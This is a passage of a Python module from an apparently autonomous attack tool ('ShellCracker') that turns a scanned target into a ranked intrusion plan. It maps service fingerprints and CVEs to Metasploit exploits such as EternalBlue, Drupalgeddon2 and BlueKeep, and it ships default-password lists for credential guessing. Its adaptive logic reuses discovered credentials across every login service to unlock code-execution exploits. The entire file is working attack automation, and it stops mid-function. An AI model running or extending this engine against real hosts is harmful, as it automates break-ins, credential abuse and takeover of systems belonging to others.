"""The autonomous attack brain: turn a target profile into a ranked plan.

This module is what makes ShellCracker *decide* rather than just run a list.
Given a :class:`~core.profiler.TargetProfile` it builds an :class:`AttackPlan`
— a scored, phased set of :class:`AttackVector` objects — from three sources:

1. a **per-category playbook** (the decision tree): for every service category
   a curated set of enumeration + credential modules (``_PLAYBOOK``);
2. a **knowledge base of high-signal exploits** (``_KNOWN_EXPLOITS``): curated
   service-fingerprint -> exploit mappings for the classics (vsftpd 2.3.4,
   UnrealIRCd, Samba usermap, distcc, EternalBlue, Shellshock, ...), so the
   engine does not depend on a text search returning them;
3. the **version-matched MSF exploit net**: ``modules.search`` per service,
   ranked by reliability and how specifically the module matches the version.

Design
------
* **Phases** run in a fixed order — cheap/safe intel first, loud/destructive
  last::

      enumerate  ->  exploit  ->  credentials  ->  misconfig

  (Post-exploitation runs separately, in the executor, once a session lands.)

* **Adaptive feedback** (:meth:`StrategyEngine.incorporate`) reshapes the plan
  mid-run from enumeration findings:
    - ``smb_ms17_010`` vulnerable  -> EternalBlue injected at top score;
    - a discovered credential      -> **reused** across every other login
      service, and cred-gated exploits (psexec, tomcat upload, postgres/mysql
      payload) are unlocked for it.

* **Scoring** is transparent and tunable (``strategy.weights``)::

      score = category_weight + rank_points + version_match_points
            + killer_bonus (knowledge-base) - noise_penalty

The engine never contacts the target; it only queries local databases.
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from typing import Any, Callable

from . import matcher
from .profiler import CATEGORY_WEIGHT, TargetProfile, categorize_service
from .recon import Service

logger = logging.getLogger("ShellCracker.strategy")

# Phase execution order. The executor honours this unless config overrides it.
# Two phases run external tools rather than MSF vectors (the executor
# special-cases them, feeding their findings back into the plan):
#   * ``vulnscan``   -- active web recon (whatweb/nuclei/gobuster/nikto);
#   * ``bruteforce`` -- hydra credential attacks against login services.
# Both run before ``exploit`` so a fingerprinted product or a discovered
# credential unlocks the matching (incl. credential-gated) exploits in time.
PHASES = ("enumerate", "vulnscan", "bruteforce", "exploit", "credentials", "misconfig")

# MSF rank -> points (0..40), blended into a vector's score.
_RANK_POINTS = {
    "excellent": 40, "great": 34, "good": 26,
    "normal": 18, "average": 12, "low": 6, "manual": 2,
}

# Login scanner per category, used both by the playbook and by credential reuse.
_LOGIN_MODULES: dict[str, str] = {
    "ssh": "scanner/ssh/ssh_login",
    "ftp": "scanner/ftp/ftp_login",
    "telnet": "scanner/telnet/telnet_login",
    "smb": "scanner/smb/smb_login",
    "mysql": "scanner/mysql/mysql_login",
    "mssql": "scanner/mssql/mssql_login",
    "postgres": "scanner/postgres/postgres_login",
    "vnc": "scanner/vnc/vnc_login",
    "pop3": "scanner/pop3/pop3_login",
    "oracle": "admin/oracle/oracle_login",
}

# --- Per-category playbook (the decision tree, as data) ----------------------
# Each category lists ("auxiliary module", "why") enum entries plus login
# modules. Keeping it declarative makes adding a technique a one-line change.
_PLAYBOOK: dict[str, dict[str, Any]] = {
    "ftp": {
        "enum": [("scanner/ftp/ftp_version", "FTP surum/banner tespiti"),
                 ("scanner/ftp/anonymous", "Anonim FTP erisimi (misconfig)")],
        "login": ["scanner/ftp/ftp_login"],
    },
    "ssh": {
        "enum": [("scanner/ssh/ssh_version", "SSH surum/algoritma tespiti")],
        "login": ["scanner/ssh/ssh_login"],
    },
    "telnet": {
        "enum": [("scanner/telnet/telnet_version", "Telnet banner tespiti")],
        "login": ["scanner/telnet/telnet_login"],
    },
    "smb": {
        "enum": [("scanner/smb/smb_version", "SMB surum/dialect ve OS tespiti"),
                 ("scanner/smb/smb_ms17_010", "MS17-010 (EternalBlue) zafiyet kontrolu"),
                 ("scanner/smb/smb_enumshares", "SMB paylasim listesi / null session"),
                 ("scanner/smb/smb_enumusers", "SMB kullanici listesi"),
                 ("scanner/smb/smb_lookupsid", "RID cycling ile kullanici/SID")],
        "login": ["scanner/smb/smb_login"],
    },
    "web": {
        "enum": [("scanner/http/http_version", "HTTP sunucu/surum tespiti"),
                 ("scanner/http/http_header", "HTTP baslik/teknoloji tespiti"),
                 ("scanner/http/robots_txt", "robots.txt gizli yol tespiti"),
                 ("scanner/http/dir_scanner", "Yaygin dizin/panel taramasi"),
                 ("scanner/http/files_dir", "Hassas dosya taramasi"),
                 ("scanner/http/options", "HTTP metod (OPTIONS) tespiti"),
                 ("scanner/http/webdav_scanner", "WebDAV acik mi kontrolu"),
                 ("scanner/http/http_put", "HTTP PUT ile yazilabilirlik")],
        "login": [],
    },
    "mysql": {
        "enum": [("scanner/mysql/mysql_version", "MySQL surum tespiti")],
        "login": ["scanner/mysql/mysql_login"],
    },
    "mssql": {
        "enum": [("scanner/mssql/mssql_ping", "MSSQL ornek/surum tespiti")],
        "login": ["scanner/mssql/mssql_login"],
    },
    "postgres": {
        "enum": [("scanner/postgres/postgres_version", "PostgreSQL surum tespiti")],
        "login": ["scanner/postgres/postgres_login"],
    },
    "oracle": {
        "enum": [("scanner/oracle/tnslsnr_version", "Oracle TNS listener surumu"),
                 ("scanner/oracle/sid_enum", "Oracle SID kesfi")],
        "login": ["admin/oracle/oracle_login"],
    },
    "redis": {
        "enum": [("scanner/redis/redis_server", "Redis kimliksiz erisim / surum")],
        "login": [],
    },
    "mongodb": {
        "enum": [("scanner/mongodb/mongodb_login", "MongoDB kimliksiz erisim kontrolu")],
        "login": [],
    },
    "rpc": {
        "enum": [("scanner/nfs/nfsmount", "NFS disa acik paylasim (showmount)"),
                 ("scanner/misc/sunrpc_portmapper", "RPC portmapper servis listesi")],
        "login": [],
    },
    "snmp": {
        "enum": [("scanner/snmp/snmp_login", "SNMP community denemesi (public/private)"),
                 ("scanner/snmp/snmp_enum", "SNMP ile sistem bilgisi toplama"),
                 ("scanner/snmp/snmp_enumusers", "SNMP kullanici listesi"),
                 ("scanner/snmp/snmp_enumshares", "SNMP paylasim listesi")],
        "login": [],
    },
    "vnc": {
        "enum": [("scanner/vnc/vnc_none_auth", "VNC kimliksiz erisim kontrolu")],
        "login": ["scanner/vnc/vnc_login"],
    },
    "rdp": {
        "enum": [("scanner/rdp/rdp_scanner", "RDP surum/NLA tespiti"),
                 ("scanner/rdp/cve_2019_0708_bluekeep", "BlueKeep zafiyet kontrolu")],
        "login": [],
    },
    "smtp": {
        "enum": [("scanner/smtp/smtp_version", "SMTP surum tespiti"),
                 ("scanner/smtp/smtp_enum", "SMTP kullanici enum (VRFY/EXPN)"),
                 ("scanner/smtp/smtp_relay", "Acik mail relay kontrolu")],
        "login": [],
    },
    "pop3": {
        "enum": [("scanner/pop3/pop3_version", "POP3 surum tespiti")],
        "login": ["scanner/pop3/pop3_login"],
    },
    "imap": {
        "enum": [("scanner/imap/imap_version", "IMAP surum tespiti")],
        "login": [],
    },
    "finger": {
        "enum": [("scanner/finger/finger_users", "Finger ile kullanici enum")],
        "login": [],
    },
    "rservices": {
        "enum": [],
        "login": ["scanner/rservices/rsh_login", "scanner/rservices/rlogin_login"],
    },
    "dns": {
        "enum": [("scanner/dns/dns_amp", "DNS amplification/acik resolver kontrolu")],
        "login": [],
    },
    "irc": {
        "enum": [("scanner/irc/unreal_ircd_3281_backdoor", "UnrealIRCd arka kapi kontrolu")],
        "login": [],
    },
    "java-rmi": {
        "enum": [("scanner/misc/java_rmi_server", "Java RMI kayit/sinif yukleme kontrolu")],
        "login": [],
    },
    "ajp": {
        "enum": [("scanner/http/tomcat_mgr_login", "Tomcat Manager (AJP arkasi) login kontrolu")],
        "login": [],
    },
    "winrm": {
        "enum": [("scanner/winrm/winrm_auth_methods", "WinRM kimlik yontemleri tespiti")],
        "login": ["scanner/winrm/winrm_login"],
    },
    "rsync": {
        "enum": [("scanner/rsync/modules_list", "rsync disa acik modul/paylasim listesi")],
        "login": [],
    },
    "elasticsearch": {
        "enum": [("scanner/elasticsearch/indices_enum", "Elasticsearch indeks/veri enum (kimliksiz)")],
        "login": [],
    },
    "couchdb": {
        "enum": [("scanner/couchdb/couchdb_enum", "CouchDB veritabani enum (kimliksiz)")],
        "login": [],
    },
    "memcached": {
        "enum": [("scanner/misc/memcached_extractor", "Memcached bellek dokumu (kimliksiz)")],
        "login": [],
    },
    "docker": {
        "enum": [("scanner/http/docker_version", "Docker API acik mi / surum")],
        "login": [],
    },
}


def _pred(
    name_subs: tuple[str, ...] = (),
    product_subs: tuple[str, ...] = (),
    version_re: str | None = None,
) -> Callable[[Service], bool]:
    """Build a service-matching predicate for a knowledge-base rule."""
    def pred(svc: Service) -> bool:
        name = (svc.name or "").lower()
        hay = f"{svc.name} {svc.product} {svc.extrainfo}".lower()
        if name_subs and not any(n in name for n in name_subs):
            if not any(n in hay for n in name_subs):
                return False
        if product_subs and not any(p in hay for p in product_subs):
            return False
        if version_re and not re.search(version_re, svc.version or "", re.I):
            return False
        return True
    return pred


# --- Knowledge base: high-signal exploits keyed on service fingerprints ------
# These are injected directly (not reliant on modules.search). ``needs_creds``
# rules wait until a credential is discovered; ``dangerous`` rules are skipped
# unless strategy.allow_dangerous is set. ``os`` restricts to an OS family.
_KNOWN_EXPLOITS: list[dict[str, Any]] = [
    dict(id="vsftpd_234", pred=_pred(product_subs=("vsftpd",), version_re=r"2\.3\.4"),
         module="unix/ftp/vsftpd_234_backdoor", rank="excellent",
         note="vsftpd 2.3.4 arka kapisi (CVE-2011-2523)"),
    dict(id="proftpd_133c", pred=_pred(product_subs=("proftpd",), version_re=r"1\.3\.3c"),
         module="unix/ftp/proftpd_133c_backdoor", rank="excellent",
         note="ProFTPD 1.3.3c arka kapisi"),
    dict(id="unrealircd", pred=_pred(product_subs=("unreal", "unrealircd")),
         module="unix/irc/unreal_ircd_3281_backdoor", rank="excellent",
         note="UnrealIRCd 3.2.8.1 arka kapisi (CVE-2010-2075)"),
    dict(id="samba_usermap", pred=_pred(product_subs=("samba",), version_re=r"3\.0\.2[0-5]"),
         module="multi/samba/usermap_script", rank="excellent",
         note="Samba usermap_script (CVE-2007-2447)"),
    dict(id="samba_trans2", pred=_pred(product_subs=("samba",), version_re=r"2\.2|3\.0"),
         module="linux/samba/trans2open", rank="great",
         note="Samba trans2open yigin tasmasi (CVE-2003-0201)"),
    dict(id="distcc", pred=_pred(name_subs=("distcc", "distccd"), product_subs=("distcc",)),
         module="unix/misc/distcc_exec", rank="excellent",
         note="distccd komut calistirma (CVE-2004-2687)"),
    dict(id="java_rmi", pred=_pred(name_subs=("java-rmi", "rmiregistry"),
                                   product_subs=("rmi", "java rmi")),
         module="multi/misc/java_rmi_server", rank="excellent",
         note="Java RMI registry uzaktan sinif yukleme"),
    dict(id="shellshock", pred=_pred(product_subs=("apache", "httpd")),
         module="multi/http/apache_mod_cgi_bash_env_exec", rank="excellent",
         note="Shellshock (CVE-2014-6271) — cgi varsa"),
    dict(id="php_cgi", pred=_pred(product_subs=("php",)),
         module="multi/http/php_cgi_arg_injection", rank="excellent",
         note="PHP-CGI arg injection (CVE-2012-1823)"),
    dict(id="drupal", pred=_pred(product_subs=("drupal",)),
         module="unix/webapp/drupal_drupalgeddon2", rank="excellent",
         note="Drupalgeddon2 (CVE-2018-7600)"),
    dict(id="webmin", pred=_pred(product_subs=("webmin",)),
         module="unix/webapp/webmin_backdoor", rank="excellent",
         note="Webmin arka kapisi (CVE-2019-15107)"),
    # --- modern / high-prevalence web app RCEs -------------------------------
    dict(id="struts2_s2045", pred=_pred(product_subs=("struts",)),
         module="multi/http/struts2_content_type_ognl", rank="excellent",
         note="Apache Struts2 S2-045 OGNL RCE (CVE-2017-5638)"),
    dict(id="struts2_s2057", pred=_pred(product_subs=("struts",)),
         module="multi/http/struts2_namespace_ognl", rank="great",
         note="Apache Struts2 S2-057 namespace OGNL RCE (CVE-2018-11776)"),
    dict(id="tomcat_jsp_put", pred=_pred(product_subs=("tomcat", "coyote")),
         module="multi/http/tomcat_jsp_upload_bypass", rank="excellent",
         note="Tomcat PUT ile JSP yukleme RCE (CVE-2017-12617)"),
    dict(id="jenkins_sc", pred=_pred(product_subs=("jenkins",)),
         module="multi/http/jenkins_script_console", rank="excellent",
         note="Jenkins Script Console RCE (acik/zayif erisim)"),
    dict(id="jboss_deploy", pred=_pred(product_subs=("jboss",)),
         module="multi/http/jboss_invoke_deploy", rank="excellent",
         note="JBoss JMX invoker ile WAR deploy RCE"),
    dict(id="couchdb_rce", pred=_pred(product_subs=("couchdb",)),
         module="linux/http/apache_couchdb_cmd_exec", rank="excellent",
         note="Apache CouchDB komut calistirma (CVE-2017-12636)"),
    dict(id="elastic_groovy", pred=_pred(product_subs=("elasticsearch",)),
         module="multi/elasticsearch/search_groovy_script", rank="excellent",
         note="Elasticsearch Groovy sandbox RCE (CVE-2015-1427)"),
    dict(id="docker_api", pred=_pred(name_subs=("docker",), product_subs=("docker",)),
         module="linux/http/docker_daemon_tcp", rank="excellent",
         note="Korumasiz Docker API ile konteyner RCE"),
    dict(id="confluence_ognl", pred=_pred(product_subs=("confluence",)),
         module="multi/http/atlassian_confluence_webwork_ognl_injection",
         rank="excellent", note="Confluence OGNL enjeksiyonu RCE (CVE-2021-26084)"),
    dict(id="joomla_hdr", pred=_pred(product_subs=("joomla",)),
         module="unix/webapp/joomla_http_header_rce", rank="great",
         note="Joomla HTTP header object injection RCE (CVE-2015-8562)"),
    dict(id="apache_pathtrav", pred=_pred(product_subs=("apache", "httpd")),
         module="multi/http/apache_normalize_path_rce", rank="great",
         note="Apache 2.4.49/50 path traversal RCE (CVE-2021-41773)"),
    dict(id="ms17_010", pred=_pred(name_subs=("microsoft-ds", "netbios-ssn")),
         module="windows/smb/ms17_010_eternalblue", rank="great", os="windows",
         note="MS17-010 EternalBlue"),
    dict(id="ms08_067", pred=_pred(name_subs=("microsoft-ds",)),
         module="windows/smb/ms08_067_netapi", rank="great", os="windows",
         note="MS08-067 netapi (eski Windows)"),
    # --- credential-gated (added once a valid credential is known) ---
    dict(id="psexec", pred=_pred(name_subs=("microsoft-ds", "netbios-ssn")),
         module="windows/smb/psexec", rank="excellent", os="windows",
         needs_creds=True, note="SMB psexec ile kod calistirma (kimlik gerekli)"),
    dict(id="tomcat_mgr", pred=_pred(product_subs=("tomcat", "coyote")),
         module="multi/http/tomcat_mgr_upload", rank="excellent",
         needs_creds=True, note="Tomcat Manager WAR yukleme (kimlik gerekli)"),
    dict(id="wp_admin_upload", pred=_pred(product_subs=("wordpress",)),
         module="unix/webapp/wp_admin_shell_upload", rank="excellent",
         needs_creds=True, note="WordPress admin ile tema/eklenti shell yukleme (kimlik gerekli)"),
    dict(id="postgres_payload", pred=_pred(name_subs=("postgresql", "postgres")),
         module="linux/postgres/postgres_payload", rank="excellent",
         needs_creds=True, note="PostgreSQL kimlikli kod calistirma"),
    dict(id="mysql_udf", pred=_pred(name_subs=("mysql",)),
         module="multi/mysql/mysql_udf_payload", rank="excellent",
         needs_creds=True, note="MySQL UDF ile kod calistirma (kimlik gerekli)"),
    # --- dangerous (skipped unless allow_dangerous) ---
    dict(id="bluekeep", pred=_pred(name_subs=("ms-wbt-server", "rdp")),
         module="windows/rdp/cve_2019_0708_bluekeep_rce", rank="manual", os="windows",
         dangerous=True, note="BlueKeep RCE (RISKLI: hedefi cokertebilir)"),
]

# --- CVE -> exploit map (for NSE-confirmed vulnerabilities) -------------------
# When the NSE vuln/vulners scan reports a host as VULNERABLE to one of these
# CVEs, the exact Metasploit module is injected at a high score -- an nmap
# finding becomes a ready-to-fire exploit without relying on version matching.
# Only CVEs with a reliable RCE module are listed; anything else is kept as an
# informational fact. ``default_port`` is used when the finding carries none.
_CVE_EXPLOITS: dict[str, dict[str, Any]] = {
    "CVE-2017-0143": dict(module="windows/smb/ms17_010_eternalblue",
                          category="smb", default_port=445, rank="great",
                          note="MS17-010 EternalBlue"),
    "CVE-2017-0144": dict(module="windows/smb/ms17_010_eternalblue",
                          category="smb", default_port=445, rank="great",
                          note="MS17-010 EternalBlue"),
    "CVE-2017-0145": dict(module="windows/smb/ms17_010_eternalblue",
                          category="smb", default_port=445, rank="great",
                          note="MS17-010 EternalBlue"),
    "CVE-2008-4250": dict(module="windows/smb/ms08_067_netapi",
                          category="smb", default_port=445, rank="great",
                          note="MS08-067 netapi"),
    "CVE-2011-2523": dict(module="unix/ftp/vsftpd_234_backdoor",
                          category="ftp", default_port=21, rank="excellent",
                          note="vsftpd 2.3.4 arka kapisi"),
    "CVE-2010-2075": dict(module="unix/irc/unreal_ircd_3281_backdoor",
                          category="irc", default_port=6667, rank="excellent",
                          note="UnrealIRCd 3.2.8.1 arka kapisi"),
    "CVE-2007-2447": dict(module="multi/samba/usermap_script",
                          category="smb", default_port=445, rank="excellent",
                          note="Samba usermap_script"),
    "CVE-2014-6271": dict(module="multi/http/apache_mod_cgi_bash_env_exec",
                          category="web", default_port=80, rank="excellent",
                          note="Shellshock"),
    "CVE-2012-1823": dict(module="multi/http/php_cgi_arg_injection",
                          category="web", default_port=80, rank="excellent",
                          note="PHP-CGI arg injection"),
    "CVE-2018-7600": dict(module="unix/webapp/drupal_drupalgeddon2",
                          category="web", default_port=80, rank="excellent",
                          note="Drupalgeddon2"),
    "CVE-2017-5638": dict(module="multi/http/struts2_content_type_ognl",
                          category="web", default_port=80, rank="excellent",
                          note="Apache Struts2 S2-045"),
    "CVE-2018-11776": dict(module="multi/http/struts2_namespace_ognl",
                           category="web", default_port=80, rank="great",
                           note="Apache Struts2 S2-057"),
    "CVE-2017-12617": dict(module="multi/http/tomcat_jsp_upload_bypass",
                           category="web", default_port=8080, rank="excellent",
                           note="Tomcat PUT JSP yukleme"),
    "CVE-2017-12636": dict(module="linux/http/apache_couchdb_cmd_exec",
                           category="couchdb", default_port=5984, rank="excellent",
                           note="CouchDB komut calistirma"),
    "CVE-2015-1427": dict(module="multi/elasticsearch/search_groovy_script",
                          category="elasticsearch", default_port=9200, rank="excellent",
                          note="Elasticsearch Groovy RCE"),
    "CVE-2021-26084": dict(module="multi/http/atlassian_confluence_webwork_ognl_injection",
                           category="web", default_port=8090, rank="excellent",
                           note="Confluence OGNL RCE"),
    "CVE-2021-41773": dict(module="multi/http/apache_normalize_path_rce",
                           category="web", default_port=80, rank="great",
                           note="Apache 2.4.49/50 path traversal RCE"),
    "CVE-2019-15107": dict(module="unix/webapp/webmin_backdoor",
                           category="web", default_port=10000, rank="excellent",
                           note="Webmin RCE"),
    "CVE-2014-3120": dict(module="multi/elasticsearch/script_mvel_rce",
                          category="elasticsearch", default_port=9200, rank="excellent",
                          note="Elasticsearch MVEL RCE"),
}

# --- Built-in credential lists (small: default-cred checks, not brute force) --
_COMMON_USERS = [
    "root", "admin", "administrator", "user", "guest", "msfadmin",
    "service", "test", "sys", "operator", "ubuntu", "kali", "oracle",
    "postgres", "tomcat", "manager", "ftp", "www-data", "support",
]
_COMMON_PASSWORDS = [
    "", "password", "admin", "root", "toor", "msfadmin", "123456",
    "letmein", "pass", "test", "changeme", "admin123", "password123",
    "P@ssw0rd", "Password1", "123456789", "qwerty", "welcome",
    "root123", "admin@123", "tomcat", "manager", "1234",
]
_SERVICE_USERS: dict[str, list[str]] = {
    "mysql": ["root", "mysql", "admin"],
    "mssql": ["sa", "admin"],
    "postgres": ["postgres", "admin"],
    "oracle": ["system", "sys", "scott", "oracle"],
    "ssh": ["root", "admin", "user", "msfadmin"],
    "ftp": ["ftp", "anonymous", "admin", "user"],
    "telnet": ["root", "admin", "msfadmin"],
    "smb": ["administrator", "admin", "guest"],
    "vnc": ["root", "admin"],
    "pop3": ["root", "admin", "user"],
}
_SERVICE_PASSWORDS: dict[str, list[str]] = {
    "mysql": ["", "root", "mysql", "password"],
    "mssql": ["", "sa", "password", "Password1"],
    "postgres": ["", "postgres", "password"],
    "oracle": ["oracle", "system", "manager", "tiger", "change_on_install"],
    "ssh": ["", "root", "toor", "msfadmin", "password", "admin"],
    "ftp": ["", "ftp", "anonymous", "password"],
}


@dataclass
class AttackVector:
    """One concrete thing the engine decided is worth trying."""

    phase: str                 # one of PHASES
    kind: str                  # exploit | enum | login | misconfig
    module: str                # msf module path WITHOUT the type prefix
    module_type: str           # "exploit" | "auxiliary"
    category: str              # service category this vector belongs to
    service_port: int
    service_name: str = ""
    score: float = 0.0
    rationale: str = ""
    options: dict[str, Any] = field(default_factory=dict)
    source: str = "playbook"   # playbook | knowledge-base | version-match | adaptive
    dangerous: bool = False
    done: bool = False

    @property
    def key(self) -> str:
        """Identity used for de-duplication (module + port)."""
        return f"{self.module_type}/{self.module}@{self.service_port}"

    def to_dict(self) -> dict[str, Any]:
        return {
            "phase": self.phase,
            "kind": self.kind,
            "module": f"{self.module_type}/{self.module}",
            "category": self.category,
            "port": self.service_port,
            "service": self.service_name,
            "score": round(self.score, 1),
            "rationale": self.rationale,
            "source": self.source,
            "options": {k: v for k, v in self.options.items() if not k.startswith("_")},
        }


@dataclass
class Finding:
    """A fact produced by executing a vector, fed back into the engine."""

    key: str                   # e.g. "smb.ms17_010", "creds", "ftp.anonymous"
    value: Any
    port: int = 0
    category: str = ""
    detail: str = ""


class AttackPlan:
    """An ordered, de-duplicated collection of attack vectors."""

    def __init__(self) -> None:
        self._vectors: list[AttackVector] = []
        self._seen: set[str] = set()

    def add(self, vector: AttackVector) -> bool:
        if vector.key in self._seen:
            return False
        self._seen.add(vector.key)
        self._vectors.append(vector)
        return True

    def all(self) -> list[AttackVector]:
        return list(self._vectors)

    def find(self, module: str, port: int | None = None) -> AttackVector | None:
        for v in self._vectors:
            if v.module == module and (port is None or v.service_port == port) and not v.done:
                return v
        return None

    def pending(self, phase: str) -> list[AttackVector]:
        """Not-yet-run vectors for ``phase``, best score first."""
        return sorted(
            (v for v in self._vectors if v.phase == phase and not v.done),
            key=lambda v: v.score, reverse=True,
        )

    def boost(self, module: str, delta: float, note: str = "") -> bool:
        for v in self._vectors:
            if v.module == module and not v.done:
                v.score += delta
                if note:
                    v.rationale = f"{v.rationale} | {note}" if v.rationale else note
                return True
        return False

    def __len__(self) -> int:  # pragma: no cover - trivial
        return len(self._vectors)


class StrategyEngine:
    """Builds and adaptively evolves the attack plan for one target."""

    def __init__(
        self, profile: TargetProfile, msf_client: Any, config: dict[str, Any]
    ) -> None:
        self.profile = profile
        self.client = msf_client
        self.cfg = (config or {}).get("strategy", {}) or {}
        self.weights = {
            "category": 1.0, "rank": 1.0, "version_match": 1.0, "noise_penalty": 1.0,
            **(self.cfg.get("weights", {}) or {}),
        }
        self.cred_cfg = self.cfg.get("credentials", {}) or {}
        self.allow_dangerous = bool(self.cfg.get("allow_dangerous", False))
        self.plan = AttackPlan()

    # -- scoring -------------------------------------------------------------
    def _score(
        self, category: str, kind: str, rank: str = "normal",
        version_match: int = 0, bonus: float = 0.0,
    ) -> float:
        w = self.weights
        score = w["category"] * CATEGORY_WEIGHT.get(category, 8)
        score += w["rank"] * _RANK_POINTS.get(rank.lower(), 18) * (
            1.0 if kind == "exploit" else 0.4
        )
        score += w["version_match"] * {0: 0, 1: 10, 2: 20}.get(version_match, 0)
        if kind == "login":
            score -= w["noise_penalty"] * 12
        if kind == "enum":
            score += 100  # enumeration is cheap/safe -> always ordered first
        return score + bonus

    # -- credential lists ----------------------------------------------------
    def _creds_for(self, category: str) -> tuple[list[str], list[str]]:
        users = list(dict.fromkeys(
            _SERVICE_USERS.get(category, []) + _COMMON_USERS
            + list(self.cred_cfg.get("extra_users", []) or [])
        ))
        passwords = list(dict.fromkeys(
            _SERVICE_PASSWORDS.get(category, []) + _COMMON_PASSWORDS
            + list(self.cred_cfg.get("extra_passwords", []) or [])
        ))
        return users, passwords

    def _login_vector(
        self, category: str, svc: Service, module: str, extra: dict[str, Any] | None = None
    ) -> AttackVector | None:
        if not self.cred_cfg.get("enabled", True):
            return None
        users, passwords = self._creds_for(category)
        options: dict[str, Any] = {
            "RHOSTS": self.profile.target, "RPORT": svc.port,
            "BLANK_PASSWORDS": True, "USER_AS_PASS": True,
            "STOP_ON_SUCCESS": bool(self.cred_cfg.get("stop_on_first_valid", True)),
            "VERBOSE": False, "CreateSession": True,
            "_users": users, "_passwords": passwords,
        }
        if extra:
            options.update(extra)
        return AttackVector(
            phase="credentials", kind="login", module=module, module_type="auxiliary",
            category=category, service_port=svc.port, service_name=svc.name,
            rationale=f"{category} varsayilan/zayif kimlik denemesi "
                      f"({len(users)}u×{len(passwords)}p, blank+user=pass)",
            options=options, score=self._score(category, "login"),
        )

    def _enum_vector(
        self, category: str, svc: Service, module: str, rationale: str,
        options: dict[str, Any] | None = None,
    ) -> AttackVector:
        opts = {"RHOSTS": self.profile.target, "RPORT": svc.port}
        if options:
            opts.update(options)
        return AttackVector(
            phase="enumerate", kind="enum", module=module, module_type="auxiliary",
            category=category, service_port=svc.port, service_name=svc.name,
            rationale=rationale, options=opts, score=self._score(category, "enum"),
        )

    # -- knowledge base ------------------------------------------------------
    def _os_ok(self, rule: dict[str, Any]) -> bool:
        want = rule.get("os")
        if not want:
            return True
        fam = self.profile.os_family
        return fam in ("unknown", want)

    def _kb_vectors(self, category: str, svc: Service, creds_known: bool = False) -> None:
        """Inject knowledge-base exploit vectors that match this service."""
        for rule in _KNOWN_EXPLOITS:
            if not rule["pred"](svc) or not self._os_ok(rule):
                continue
            if rule.get("needs_creds") and not creds_known:
                continue  # unlocked later by incorporate() on credential discovery
            if rule.get("dangerous") and not self.allow_dangerous:
                self.profile.notes.append(
                    f"Atlanan riskli exploit: {rule['module']} ({rule['note']}). "
                    "Acmak icin strategy.allow_dangerous=true."
                )
                continue
            options = {"RHOSTS": self.profile.target, "RPORT": svc.port}
            if rule.get("needs_creds") and creds_known:
                options.update(self._best_cred_options(category, rule["module"]))
            self.plan.add(AttackVector(
                phase="exploit", kind="exploit", module=rule["module"],
                module_type="exploit", category=category,
                service_port=svc.port, service_name=svc.name,
                rationale=f"[bilgi tabani] {rule['note']}",
                source="knowledge-base", dangerous=rule.get("dangerous", False),
                # KB gets a killer bonus so curated classics outrank noisy search hits.
                score=self._score(category, "exploit", rank=rule["rank"],
                                  version_match=2, bonus=40),
                options=options,
            ))

    def _best_cred_options(self, category: str, module: str) -> dict[str, Any]:
        """Pick a discovered credential suitable for a cred-gated exploit."""
        creds = self.profile.facts.get("creds", [])
        pick = next((c for c in creds if c["service"] == category), None) \
            or (creds[0] if creds else None)
        if not pick:
            return {}
        if "smb" in module or "psexec" in module:
            return {"SMBUser": pick["user"], "SMBPass": pick["password"]}
        return {"USERNAME": pick["user"], "PASSWORD": pick["password"]}

    # -- version-matched exploit net -----------------------------------------
    def _add_version_exploits(self, category: str, svc: Service) -> None:
        if self.client is None:
            return
        cands = matcher.exploit_candidates_for_service(svc, self.client)
        cap = int(self.cfg.get("max_exploits_per_service", 6))
        for cand in cands[:cap]:
            vm = matcher.version_match_strength(cand.module, svc)
            self.plan.add(AttackVector(
                phase="exploit", kind="exploit", module=cand.module,
                module_type="exploit", category=category,
                service_port=svc.port, service_name=svc.name,
                rationale=(f"{svc.banner or svc.name} icin MSF exploit (rank={cand.rank}"
                           + (", surum eslesti" if vm == 2 else
                              ", urun eslesti" if vm == 1 else "") + ")"),
                source="version-match",
                score=self._score(category, "exploit", rank=cand.rank, version_match=vm),
                options={"RHOSTS": self.profile.target, "RPORT": svc.port},
            ))

    # -- plan construction ---------------------------------------------------
    def build(self) -> AttackPlan:
        """Walk every service through its playbook, the KB, and the exploit net."""
        for category in self.profile.categories():
            book = _PLAYBOOK.get(category, {})
            for svc in self.profile.categorized[category]:
                # 1) declarative playbook: enumeration + login
                for module, why in book.get("enum", []):
                    self.plan.add(self._enum_vector(category, svc, module, why))
                # HTTPS/TLS services also get a Heartbleed check.
                if category == "web" and self._is_tls(svc):
                    self.plan.add(self._enum_vector(
                        category, svc, "scanner/ssl/openssl_heartbleed",
                        "Heartbleed (CVE-2014-0160) kontrolu"))
                for module in book.get("login", []):
                    v = self._login_vector(category, svc, module)
                    if v:
                        self.plan.add(v)
                # 2) knowledge base of high-signal exploits
                self._kb_vectors(category, svc)
                # 3) broad version-matched MSF exploit net
                self._add_version_exploits(category, svc)

        logger.info(
            "Strateji: %d vektor planlandi (%s).", len(self.plan),
            ", ".join(f"{p}={len(self.plan.pending(p))}" for p in PHASES
                      if self.plan.pending(p)) or "bos",
        )
        return self.plan

    @staticmethod
    def _is_tls(svc: Service) -> bool:
        blob = f"{svc.name} {svc.extrainfo} {svc.product}".lower()
        return ("https" in blob or "ssl" in blob or "tls" in blob
                or svc.port in (443, 8443, 993, 995, 465))

    # -- adaptive feedback ---------------------------------------------------
    def incorporate(self, findings: list[Finding]) -> list[AttackVector]:
        """React to findings: boost or inject vectors (the autonomous loop)."""
        new: list[AttackVector] = []
        for f in findings:
            if f.key == "smb.ms17_010":
                mod = "windows/smb/ms17_010_eternalblue"
                if not self.plan.boost(mod, 200, "MS17-010 ZAFIYETLI tespit edildi"):
                    v = AttackVector(
                        phase="exploit", kind="exploit", module=mod,
                        module_type="exploit", category="smb",
                        service_port=f.port or 445, service_name="microsoft-ds",
                        rationale="MS17-010 tarayici ZAFIYETLI dedi -> EternalBlue",
                        source="adaptive", score=400,
                        options={"RHOSTS": self.profile.target, "RPORT": f.port or 445},
                    )
                    if self.plan.add(v):
                        new.append(v)

            elif f.key == "ftp.anonymous":
                self.profile.add_fact("ftp.anonymous", True)
                self.profile.notes.append(f"Anonim FTP acik (port {f.port}).")

            elif f.key == "smb.null_session":
                self.profile.add_fact("smb.null_session", True)

            elif f.key == "nfs.export":
                self.profile.add_fact("nfs.exports", [f.value])
                self.profile.notes.append(f"NFS disa acik paylasim: {f.value}")

            elif f.key == "creds":
                # value should be a (user, password) pair; skip anything else
                # rather than letting a malformed finding abort the whole run.
                try:
                    user, pw = f.value
                except (TypeError, ValueError):
                    logger.debug("gecersiz 'creds' bulgu degeri atlandi: %r", f.value)
